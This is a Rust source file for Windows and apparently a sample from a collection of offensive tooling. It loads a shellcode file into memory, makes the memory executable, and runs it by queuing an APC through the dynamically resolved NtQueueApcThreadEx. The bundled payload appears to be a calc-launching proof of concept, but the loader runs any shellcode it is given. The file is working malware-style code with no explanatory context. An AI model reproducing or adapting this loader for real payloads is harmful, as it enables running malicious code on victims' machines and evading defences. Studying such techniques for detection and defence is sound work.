use std::ffi::c_void;
use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE, HANDLE};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::GetCurrentThread;

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    unsafe {
        let ntdll = LoadLibraryA(b"ntdll.dll\0".as_ptr());
        if ntdll == 0 {
            panic!("[-]LoadLibraryA failed: {}!", GetLastError());
        }

        let fn_nt_queue_apc_thread_ex = GetProcAddress(ntdll, b"NtQueueApcThreadEx\0".as_ptr());

        let nt_queue_apc_thread_ex: extern "C" fn(HANDLE, isize, *mut c_void, isize, isize, isize) =
            transmute(fn_nt_queue_apc_thread_ex);

        let addr = VirtualAlloc(
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAlloc failed: {}!", GetLastError());
        }

        copy(shellcode.as_ptr(), addr.cast(), shellcode_size);

        let mut old = PAGE_READWRITE;
        let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtect failed: {}!", GetLastError());
        }

        let handle = GetCurrentThread();
        if handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        nt_queue_apc_thread_ex(handle, 1, addr, 0, 0, 0);
    }
}
